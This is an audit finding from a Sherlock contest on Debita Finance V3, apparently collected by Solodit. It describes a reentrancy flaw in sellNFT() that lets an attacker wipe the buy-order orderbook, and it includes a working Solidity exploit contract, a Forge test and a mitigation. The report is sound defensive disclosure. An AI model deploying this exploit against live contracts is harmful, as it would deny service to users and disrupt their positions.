---
# Core Classification
protocol: Debita Finance V3
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 44235
audit_firm: Sherlock
contest_link: https://app.sherlock.xyz/audits/contests/627
source_link: none
github_link: https://github.com/sherlock-audit/2024-10-debita-judging/issues/326

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 7
finders:
  - VAD37
  - AdamSzymanski
  - copperscrewer
  - tourist
  - 0x37
---

## Vulnerability Title

M-7: An attacker can wipe the orderbook in buyOrderFactory.sol

### Overview


The bug report describes a vulnerability in the `buyOrderFactory.sol` contract that allows a malicious attacker to wipe the entire orderbook. This can lead to a denial of service (DoS) state in buy order matching and prevent the closing and selling of existing positions. The root cause of this vulnerability is the lack of reentrancy protection in the `sellNFT()` function. This allows the attacker to repeatedly exploit the function and delete multiple buy orders. The impact of this vulnerability is that the orderbook will be inaccessible, and off-chain services that rely on data from the orderbook will be temporarily blocked. The bug report includes a proof of concept (PoC) and suggests applying reentrancy protection as a mitigation measure.

### Original Finding Content

Source: https://github.com/sherlock-audit/2024-10-debita-judging/issues/326 

## Found by 
0x37, AdamSzymanski, VAD37, Vidus, copperscrewer, liquidbuddha, tourist
### Summary

A malicious actor can wipe the complete buy order orderbook in `buyOrderFactory.sol`. The attack - excluding gas costs - does not bear any financial burden on the attacker. As a result of the exploit, the orderbook will be temporarily inaccessible in the factory, leading to a DoS state in buy order matching, and in closing and selling existing positions.

### Root Cause

The function `sellNFT(uint receiptID)` lacks reentrancy protection:
https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/buyOrders/buyOrder.sol#L92

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

1. Attacker calls `createBuyOrder(address _token, address wantedToken, uint _amount, uint ratio)` with exploit contract supplied in parameter `wantedToken`
2. Attacker calls `sellNFT(uint receiptID)` which triggers the exploit sequence
3. Exploit contract will reenter `sellNFT` multiple times, triggering a cascade of buy order deletions

### Impact

The orderbook in `buyOrderFactory.sol` will be inaccessible. The function `getActiveBuyOrders(uint offset, uint limit)` is used by off-chain services to gather buy order data - this data will be temporarily blocked. Deleting existing buy orders (`deleteBuyOrder()`) and selling NFTs (`sellNFT(uint receiptID)`) will also be temporarily blocked until the issue is resolved manually. Issue can be resolved manually by:
- Opening dummy buy orders with very little collateral
- Closing/selling positions on existing "legit" orders

### PoC

Note: the PoC is somewhat hastily developed as the audit deadline is quite short relative to the project scope. Executing the PoC with the verbose flag (forge test -vvvv) will show that deletion is triggered multiple times.

Exploit contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface BuyOrder {
    function sellNFT(uint receiptID) external;
}

contract Exploit {
    BuyOrder public buyOrder;
    uint public counter = 0;
    uint public counterMax = 2;

    struct receiptInstance {
        uint receiptID;
        uint attachedNFT;
        uint lockedAmount;
        uint lockedDate;
        uint decimals;
        address vault;
        address underlying;
    }

    constructor() {}

    function setBuyOrder(address _buyOrder) public {
        buyOrder = BuyOrder(_buyOrder);
    }

    fallback() external payable {
        if (counter < 2) {
            counter++;
            buyOrder.sellNFT(0);
        }

        if (counter == counterMax) {
            counter++;
            buyOrder.sellNFT(1);
        } 

    }

    function getDataByReceipt(uint receiptID) public view returns (receiptInstance memory) {
        uint lockedAmount;
        if (receiptID == 1) {
            lockedAmount = 1;
        } else {
            lockedAmount = 0;
        }

        uint lockedDate = 0;
        uint decimals = 0;
        address vault = address(this);
        address underlying = address(this);
        bool OwnerIsManager = true;
        return receiptInstance(receiptID, 0, lockedAmount, lockedDate, decimals, vault, underlying);
    }

}
```

Forge test:
```solidity
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "forge-std/StdCheats.sol";

import {BuyOrder, buyOrderFactory} from "@contracts/buyOrders/buyOrderFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

import {Exploit} from "./exploit.sol";

contract BuyOrderTest is Test {
    buyOrderFactory public factory;
    BuyOrder public buyOrder;
    BuyOrder public buyOrderContract;
    ERC20Mock public AERO;
    Exploit public exploit;

    function setUp() public {
        BuyOrder instanceDeployment = new BuyOrder();
        factory = new buyOrderFactory(address(instanceDeployment));
        AERO = new ERC20Mock();
    }

    function testMultipleDeleteBuyOrder() public {
        address alice = makeAddr("alice");
        deal(address(AERO), alice, 1000e18, false);

        vm.startPrank(alice);
        IERC20(AERO).approve(address(factory), 1000e18);
        exploit = new Exploit();

        factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
        factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
        factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
        
        address _buyOrderAddress = factory.createBuyOrder(
            address(AERO),
            address(exploit),
            1,
            1
        );

        exploit.setBuyOrder(_buyOrderAddress);
        buyOrderContract = BuyOrder(_buyOrderAddress);

        buyOrderContract.sellNFT(2);

        vm.stopPrank();
    }

}

```

### Mitigation

Apply reentrancy protection on the function `sellNFT(uint receiptID)`:
https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/buyOrders/buyOrder.sol#L92

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Sherlock |
| Protocol | Debita Finance V3 |
| Report Date | N/A |
| Finders | VAD37, AdamSzymanski, copperscrewer, tourist, 0x37, liquidbuddha, Vidus |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/sherlock-audit/2024-10-debita-judging/issues/326
- **Contest**: https://app.sherlock.xyz/audits/contests/627

### Keywords for Search

`vulnerability`

